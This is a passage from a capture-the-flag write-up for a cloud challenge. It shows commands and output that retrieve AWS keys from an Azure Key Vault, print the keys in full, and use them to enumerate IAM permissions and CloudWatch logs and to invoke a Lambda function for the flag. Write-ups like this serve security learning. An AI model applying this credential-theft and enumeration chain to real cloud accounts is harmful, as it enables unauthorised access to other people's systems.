⠈⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⣶⣤⣤⣀⡀⠀⠀⠀⢀⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⣄
   Send us the details!            ⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣹
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⢸⣧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣤⣄⣀⡀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣻⣷⣶⣾⣿⣿⡿⢯⣛⣛⡋⠁⠀⠀⠉⠙⠛⠛⠿⣿⣿⡷⣶⣿
            """,
            status_code=200
    )
```

The source code appears to be getting credentials from Azure Key Vault which would be used to connect to invoke an AWS lambda function. We can try to retrieve the details via the cli. 

```bash
bash-5.1# az keyvault secret show --vault-name olympurr-aws -n AKIA5G4XMRW7TLT6XD7R
{
  "attributes": {
    "created": "2022-11-18T03:25:20+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2022-11-18T03:25:20+00:00"
  },
  "contentType": "",
  "id": "https://olympurr-aws.vault.azure.net/secrets/AKIA5G4XMRW7TLT6XD7R/05c534380f7b480d90dcaffc7364bce6",
  "kid": null,
  "managed": null,
  "name": "AKIA5G4XMRW7TLT6XD7R",
  "tags": {},
  "value": "fgQdSIETJp/yBKwWbmf2SprGa2eXWyqgkeeIdWtL"
}
```

With this can switch over to AWS and log in with `AKIA5G4XMRW7TLT6XD7R:fgQdSIETJp/yBKwWbmf2SprGa2eXWyqgkeeIdWtL`. 

``` bash
$ aws sts get-caller-identity --profile stf
{
    "Account": "908166204863", 
    "UserId": "AIDA5G4XMRW7UAWT26Q6Q", 
    "Arn": "arn:aws:iam::908166204863:user/azure_user"
}
```

From this point on, it's pretty much a repeat of TISC which is just, List attached user -> List policy version to figure out account perms.

```bash
$ aws iam list-attached-user-policies --user-name azure_user --profile stf
{
    "AttachedPolicies": [
        ...
        {
            "PolicyName": "azure-policy-extended", 
            "PolicyArn": "arn:aws:iam::908166204863:policy/azure-policy-extended"
        }, 
        ...
    ]
}
```
```bash
$ aws iam get-policy-version --policy-arn arn:aws:iam::908166204863:policy/azure-policy-extended --version-id v1 --profile stf
{
    "PolicyVersion": {
                ...
                    "Action": [
                        "lambda:Invoke*", 
                        "lambda:ListFunctions", 
                        "lambda:CreateFunction", 
                        "logs:DescribeLogGroups", 
                        "logs:DescribeLogStreams", 
                        "logs:GetLogEvents", 
                        "lambda:UpdateFunctionCode"
                    ], 
                    "Resource": "*", 
                    "Effect": "Allow"
                ...
}
```

Based on the challenge description, we're supposed to invoke some function to get the flag. While we do seem to have the `lambda:ListFunctions` permission, it still seems like we're getting blocked.

```
$ aws lambda list-functions --profile stf

An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:aws:iam::908166204863:user/azure_user is not authorized to perform: lambda:ListFunctions on resource: * with an explicit deny in a permissions boundary
```

However, we are also granted some permissions on logs. Using those we can view the log groups.

```bash
$ aws logs describe-log-groups --profile stf
{
    "logGroups": [
        {
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/agent-webservice:*", 
            "creationTime": 1665202979754, 
            "metricFilterCount": 0, 
            "logGroupName": "/aws/lambda/agent-webservice", 
            "storedBytes": 687
        }, 
        {
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechalleng-UpdateRolesWithIDPFuncti-LUiAZ9V8Ozui:*", 
            "creationTime": 1661694112426, 
            "metricFilterCount": 0, 
            "logGroupName": "/aws/lambda/amplify-stfmobilechalleng-UpdateRolesWithIDPFuncti-LUiAZ9V8Ozui", 
            "storedBytes": 964
        }, 
        {
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechallenge-pr-UserPoolClientLambda-zd7XTYeuNczP:*", 
            "creationTime": 1661694081981, 
            "metricFilterCount": 0, 
            "logGroupName": "/aws/lambda/amplify-stfmobilechallenge-pr-UserPoolClientLambda-zd7XTYeuNczP", 
            "storedBytes": 807
        }, 
        {
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechallenge-prod-21-RoleMapFunction-iQfrqN7EZzDT:*", 
            "creationTime": 1661694156003, 
            "metricFilterCount": 0, 
            "logGroupName": "/aws/lambda/amplify-stfmobilechallenge-prod-21-RoleMapFunction-iQfrqN7EZzDT", 
            "storedBytes": 1123
        }, 
        {
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/event-webservice:*", 
            "creationTime": 1664456644866, 
            "metricFilterCount": 0, 
            "logGroupName": "/aws/lambda/event-webservice", 
            "storedBytes": 3807231
        }, 
        {
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:*", 
            "creationTime": 1664456602816, 
            "metricFilterCount": 0, 
            "logGroupName": "/aws/lambda/internal-secret-of-MeowOlympurr-webservice", 
            "storedBytes": 18021
        }
    ]
}
```

And in AWS CloudWatch docs it states

> Lambda automatically integrates with CloudWatch Logs and pushes all logs from your code to a CloudWatch Logs group associated with a Lambda function, which is named /aws/lambda/\<function name>.

So we also have the function names and can invoke them directly. 

```bash
$ aws lambda invoke --function-name internal-secret-of-MeowOlympurr-webservice output --profile stf
```

The above command would output the flag into the file `output`. However, 3am me copy-pasted the command from my previous writeup and just replaced the function name, not noticing there was an output file. Seeing how there was no flag, I assumed that it was outputted into the logs. So I went to read all the logs, invoked all the functions, and read those logs too. This was how I found out (by reading other participants' submitted URLs) that there was the SSRF rabbit hole way back which I accidentally passed. Lucky me. 

Only 2 hours later did I decide to run a `ls` on my system.  

```bash
$ cat output 
{"statusCode": 200, "headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*"}, "body": "{\"Message\": \"STF22{LIveInTh3Me0wmen7_:3}\"}", "isBase64Encoded": false}
```

Flag: `STF22{LIveInTh3Me0wmen7_:3}`


Conclusion
------

Like TISC, Secrets of Meow Olympurr was also terribly long but without the luxury of time to slowly work through it. However, what I did have was the experience of working on the TISC challenge. This challenge tested my application of what I had learnt, at the same time exposing me to Azure. In summary, I feel that this challenge was really educational for cloud noobs like myself, but for such a long challenge, it would've been nice if it was worth more points. 
